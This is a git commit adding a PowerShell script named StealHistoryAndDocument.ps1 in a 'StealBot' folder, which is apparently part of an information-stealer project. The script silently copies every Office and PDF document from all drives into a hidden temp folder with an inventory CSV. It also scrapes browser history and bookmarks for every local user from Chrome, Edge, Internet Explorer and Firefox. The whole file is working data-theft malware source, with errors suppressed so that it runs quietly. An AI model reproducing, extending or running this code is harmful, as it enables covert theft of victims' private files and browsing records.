de972fd07d8e130fc2a1936ce73486625af2d0f1
NGUYEN VAN LONG <longkd719@gmail.com>
2024-03-09 15:02:01 +0700

    nham :v

---
+++ StealBot/StealHistoryAndDocument.ps1
@@ -0,0 +1,286 @@
+$extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf')
+
+$destinationFolder = "$env:tmp\21f64da1e5792c8295b964d159a14491"
+
+if (-not (Test-Path -Path $destinationFolder)) {
+    New-Item -ItemType Directory -Path $destinationFolder -Force
+}
+
+$filesInfo = @()
+
+Get-PSDrive -PSProvider FileSystem | Select-Object Root | ForEach-Object {
+    Get-ChildItem -Path $_.Root -Recurse -ErrorAction SilentlyContinue
+} | Where-Object {
+    $_.FullName -notmatch 'C:\\Program Files*|C:\\Windows*'
+} | Where-Object {
+    $extensions -contains $_.Extension
+} | ForEach-Object {
+    $destinationPath = Join-Path -Path $destinationFolder -ChildPath $_.Name
+    try {
+        Copy-Item $_.FullName -Destination $destinationPath -Force -ErrorAction Stop
+        $filesInfo += [PSCustomObject]@{
+            Name          = $_.Name
+            FullName      = $_.FullName
+            LastWriteTime = $_.LastWriteTime
+            Length        = $_.Length
+        }
+    }
+    catch {
+
+    }
+}
+
+$csvFilePath = Join-Path -Path $destinationFolder -ChildPath 'CopiedFilesInfo.csv'
+$filesInfo | Export-Csv -Path $csvFilePath -Encoding Unicode -NoTypeInformation
+
+function Get-BrowserData {
+    [CmdletBinding()]
+    Param
+    (
+        [Parameter(Position = 0)]
+        [String[]]
+        [ValidateSet('Chrome','IE','FireFox', 'All')]
+        $Browser = 'All',
+
+        [Parameter(Position = 1)]
+        [String[]]
+        [ValidateSet('History','Bookmarks','All')]
+        $DataType = 'All',
+
+        [Parameter(Position = 2)]
+        [String]
+        $UserName = '',
+
+        [Parameter(Position = 3)]
+        [String]
+        $Search = ''
+    )
+
+    function ConvertFrom-Json20([object] $item){
+        #http://stackoverflow.com/a/29689642
+        Add-Type -AssemblyName System.Web.Extensions
+        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+        return ,$ps_js.DeserializeObject($item)
+        
+    }
+
+    function Get-ChromeHistory {
+        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
+        if (-not (Test-Path -Path $Path)) {
+            Write-Verbose "[!] Could not find Chrome History for username: $UserName"
+        }
+        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+        $Value | ForEach-Object {
+            $Key = $_
+            if ($Key -match $Search){
+                New-Object -TypeName PSObject -Property @{
+                    User = $UserName
+                    Browser = 'Chrome'
+                    DataType = 'History'
+                    Data = $_
+                }
+            }
+        }        
+    }
+
+    function Get-EdgeHistory {
+        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        if (-not (Test-Path -Path $Path)) {
+            Write-Verbose "[!] Could not find Edge History for username: $UserName"
+        }
+        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+        $Value | ForEach-Object {
+            $Key = $_
+            if ($Key -match $Search){
+                New-Object -TypeName PSObject -Property @{
+                    User = $UserName
+                    Browser = 'Edge'
+                    DataType = 'History'
+                    Data = $_
+                }
+            }
+        }        
+    }
+
+    function Get-ChromeBookmarks {
+    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    if (-not (Test-Path -Path $Path)) {
+        Write-Verbose "[!] Could not find FireFox Bookmarks for username: $UserName"
+    }   else {
+            $Json = Get-Content $Path
+            $Output = ConvertFrom-Json20($Json)
+            $Jsonobject = $Output.roots.bookmark_bar.children
+            $Jsonobject.url |Sort -Unique | ForEach-Object {
+                if ($_ -match $Search) {
+                    New-Object -TypeName PSObject -Property @{
+                        User = $UserName
+                        Browser = 'Chrome'
+                        DataType = 'Bookmark'
+                        Data = $_
+                    }
+                }
+            }
+        }
+    }
+
+    function Get-EdgeBookmarks {
+    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    if (-not (Test-Path -Path $Path)) {
+        Write-Verbose "[!] Could not find FireFox Bookmarks for username: $UserName"
+    }   else {
+            $Json = Get-Content $Path
+            $Output = ConvertFrom-Json20($Json)
+            $Jsonobject = $Output.roots.bookmark_bar.children
+            $Jsonobject.url |Sort -Unique | ForEach-Object {
+                if ($_ -match $Search) {
+                    New-Object -TypeName PSObject -Property @{
+                        User = $UserName
+                        Browser = 'Chrome'
+                        DataType = 'Bookmark'
+                        Data = $_
+                    }
+                }
+            }
+        }
+    }
+
+    function Get-InternetExplorerHistory {
+        #https://crucialsecurityblog.harris.com/2011/03/14/typedurls-part-1/
+
+        $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
+        $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
+
+        ForEach($Path in $Paths) {
+
+            $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value
+
+            $Path = $Path | Select-Object -ExpandProperty PSPath
+
+            $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
+            if (-not (Test-Path -Path $UserPath)) {
+                Write-Verbose "[!] Could not find IE History for SID: $Path"
+            }
+            else {
+                Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
+                    $Key = $_
+                    $Key.GetValueNames() | ForEach-Object {
+                        $Value = $Key.GetValue($_)
+                        if ($Value -match $Search) {
+                            New-Object -TypeName PSObject -Property @{
+                                User = $UserName
+                                Browser = 'IE'
+                                DataType = 'History'
+                                Data = $Value
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    function Get-InternetExplorerBookmarks {
+        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
+        ForEach ($URL in $URLs) {
+            if ($URL.FullName -match 'Favorites') {
+                $User = $URL.FullName.split('\')[2]
+                Get-Content -Path $URL.FullName | ForEach-Object {
+                    try {
+                        if ($_.StartsWith('URL')) {
+                            # parse the .url body to extract the actual bookmark location
+                            $URL = $_.Substring($_.IndexOf('=') + 1)
+
+                            if($URL -match $Search) {
+                                New-Object -TypeName PSObject -Property @{
+                                    User = $User
+                                    Browser = 'IE'
+                                    DataType = 'Bookmark'
+                                    Data = $URL
+                                }
+                            }
+                        }
+                    }
+                    catch {
+                        Write-Verbose "Error parsing url: $_"
+                    }
+                }
+            }
+        }
+    }
+
+    function Get-FireFoxHistory {
+        $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
+        if (-not (Test-Path -Path $Path)) {
+            Write-Verbose "[!] Could not find FireFox History for username: $UserName"
+        }
+        else {
+            $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
+            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
+            $Value.Value |ForEach-Object {
+                if ($_ -match $Search) {
+                    ForEach-Object {
+                    New-Object -TypeName PSObject -Property @{
+                        User = $UserName
+                        Browser = 'Firefox'
+                        DataType = 'History'
+                        Data = $_
+                        }    
+                    }
+                }
+            }
+        }
+    }
+
+    if (!$UserName) {
+        $UserName = "$ENV:USERNAME"
+    }
+
+    if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
+            Get-ChromeHistory
+        }
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
+            Get-ChromeBookmarks
+        }
+    }
+
+    if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
+            Get-InternetExplorerHistory
+        }
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
+            Get-InternetExplorerBookmarks
+        }
+    }
+
+    if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
+            Get-FireFoxHistory
+        }
+    }
+
+    if(($Browser -Contains 'All') -or ($Browser -Contains 'Edge')) {
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
+            Get-EdgeHistory
+        }
+    }
+
+    if(($Browser -Contains 'All') -or ($Browser -Contains 'Edge')) {
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
+            Get-EdgeHistory
+        }
+        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
+            Get-EdgeBookmarks
+        }
+    }
+}
+
+$path = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c"
+if(!(test-path $path)) {
+    New-Item -ItemType Directory -Force -Path $path
+}
+Get-ChildItem C:\Users | ForEach-Object {Get-BrowserData -UserName $_.Name -ErrorAction SilentlyContinue} | Export-Csv $path\BrowserHistory.csv -NoTypeInformation -Force
+
